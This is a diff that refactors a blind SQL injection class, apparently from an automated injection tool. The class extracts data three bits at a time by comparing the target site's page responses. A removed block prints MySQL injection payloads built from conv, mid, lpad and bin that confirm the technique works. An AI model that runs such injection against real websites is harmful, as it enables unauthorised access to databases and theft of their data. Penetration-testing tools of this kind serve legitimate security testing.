@@ -13,9 +13,6 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 
-/**
- * A blind attack class using concurrent threads.
- */
 public class InjectionMultibit extends AbstractInjectionBoolean<CallableMultibit> {
 
     /**
@@ -23,35 +20,20 @@ public class InjectionMultibit extends AbstractInjectionBoolean<CallableMultibit
      */
     private static final Logger LOGGER = LogManager.getRootLogger();
 
-    // Source code of the TRUE web page (usually ?id=1)
     private String sourceRef;
 
-//    /**
-//     * List of string differences found in all the FALSE queries, compared
-//     * to the TRUE page (aka opcodes). Each FALSE pages should contain
-//     * at least one same string, which shouldn't be present in all
-//     * the TRUE queries.
-//     */
     private List<Diff> diffsRefWithMultibitIds = new ArrayList<>();
-    private List<List<Diff>> multibitIds = new ArrayList<>();
+    private final List<List<Diff>> multibitIds = new ArrayList<>();
 
-    /**
-     * Create blind attack initialization.
-     * If every false test are not in true mark and every true test are in
-     * true test, then blind attack is confirmed.
-     * @param blindMode
-     */
     public InjectionMultibit(InjectionModel injectionModel, BooleanMode blindMode) {
         
         super(injectionModel, blindMode);
         
-//        // No blind
-//        if (this.falseTest.isEmpty() || this.injectionModel.isStoppedByUser()) {
-//
-//            return;
-//        }
-//
-        // Call the SQL request which must be TRUE (usually ?id=1)
+        if (this.injectionModel.isStoppedByUser()) {
+
+            return;
+        }
+
         this.sourceRef = this.callUrl("8", "multibit#ref");
 
         ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetMultibitIds");
@@ -65,7 +47,6 @@ public class InjectionMultibit extends AbstractInjectionBoolean<CallableMultibit
                     ""+i,
                     this.injectionModel,
                     this,
-                    this.booleanMode,
                     "multibit#ref~" + i
                 )
             );
@@ -83,13 +64,13 @@ public class InjectionMultibit extends AbstractInjectionBoolean<CallableMultibit
 
             for (Future<CallableMultibit> multibitIdRef: multibitIdRefs) {
 
-                List<Diff> a = multibitIdRef.get().getOpcodes();
+                List<Diff> opcodes = multibitIdRef.get().getOpcodes();
                 if (this.diffsRefWithMultibitIds.isEmpty()) {
-                    this.diffsRefWithMultibitIds = new ArrayList<>(a);
+                    this.diffsRefWithMultibitIds = new ArrayList<>(opcodes);
                 } else {
-                    this.diffsRefWithMultibitIds.retainAll(a);
+                    this.diffsRefWithMultibitIds.retainAll(opcodes);
                 }
-                multibitIds.add(a);
+                multibitIds.add(opcodes);
             }
 
             for (List<Diff> multibitId : multibitIds) {
@@ -109,14 +90,15 @@ public class InjectionMultibit extends AbstractInjectionBoolean<CallableMultibit
     }
 
     @Override
-    public CallableMultibit getCallableSizeTest(String sqlQuery, int indexCharacter) {
-
-        return new CallableMultibit(sqlQuery, indexCharacter, this.injectionModel, this, this.booleanMode, "size:" + indexCharacter);
-    }
-
-    @Override
     public CallableMultibit getCallableMultibitTest(String sqlQuery, int indexCharacter, int block) {
-        return new CallableMultibit(sqlQuery, indexCharacter, block, this.injectionModel, this, this.booleanMode, "multi#" + indexCharacter + "." + block);
+        return new CallableMultibit(
+            sqlQuery,
+            indexCharacter,
+            block,
+            this.injectionModel,
+            this,
+            "multi#" + indexCharacter + "." + block
+        );
     }
 
     @Override
@@ -132,48 +114,21 @@ public class InjectionMultibit extends AbstractInjectionBoolean<CallableMultibit
             throw new StoppedByUserSlidingException();
         }
 
-        var blindTest1 = new CallableMultibit(
-            "'0'|conv(mid(lpad(bin(ascii('a')),8,'0'),1,3),2,10)",
-            this.injectionModel,
-            this,
-            this.booleanMode,
-            "multibit#confirm~1"
-        );
-        var blindTest2 = new CallableMultibit(
-            "'0'|conv(mid(lpad(bin(ascii('a')),8,'0'),4,3),2,10)",
-            this.injectionModel,
-            this,
-            this.booleanMode,
-            "multibit#confirm~2"
-        );
-        var blindTest3 = new CallableMultibit(
-            "'0'|conv(mid(lpad(bin(ascii('a')),8,'0'),7,3),2,10)",
-            this.injectionModel,
-            this,
-            this.booleanMode,
-            "multibit#confirm~3"
-        );
+        var callableBlock1 = new CallableMultibit("'a'", 1, 1, this.injectionModel, this, "multi#confirm.1");
+        var callableBlock2 = new CallableMultibit("'a'", 1, 2, this.injectionModel, this, "multi#confirm.2");
+        var callableBlock3 = new CallableMultibit("'a'", 1, 3, this.injectionModel, this, "multi#confirm.3");
 
-        try {
-            blindTest1.call();
-            blindTest2.call();
-            blindTest3.call();
-        } catch (Exception e) {
-            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
-        }
+        callableBlock1.call();
+        callableBlock2.call();
+        callableBlock3.call();
 
-        return blindTest1.getIdPage() == 3 && blindTest2.getIdPage() == 0 && blindTest3.getIdPage() == 1;
+        return callableBlock1.getIdPage() == 3 && callableBlock2.getIdPage() == 0 && callableBlock3.getIdPage() == 1;
     }
 
     @Override
     public String getInfoMessage() {
         
-        return
-            "Multibit strategy: a request is true if the diff between"
-            + " a correct page (e.g existing id) and current page"
-            + " is not as the following: "
-//            + this.constantFalseMark
-        ;
+        return "- Strategy Multibit: page matching following Diffs converts to related 3 bits => " + this.multibitIds + "\n\n";
     }
     
     
